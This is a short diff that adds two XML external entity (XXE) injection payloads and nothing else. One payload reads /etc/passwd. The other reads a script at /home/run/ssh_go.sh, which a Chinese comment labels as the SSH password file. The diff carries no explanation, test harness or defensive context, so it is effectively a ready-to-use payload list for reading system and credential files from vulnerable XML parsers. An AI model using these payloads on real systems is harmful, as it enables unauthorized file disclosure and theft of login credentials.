@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ELEMENT test ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root><name>&xxe;</name></root>
+
+
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ELEMENT test ANY ><!ENTITY xxe SYSTEM "file:///home/run/ssh_go.sh">]>
+<root><name>&xxe;</name></root>   #SSH密码文件
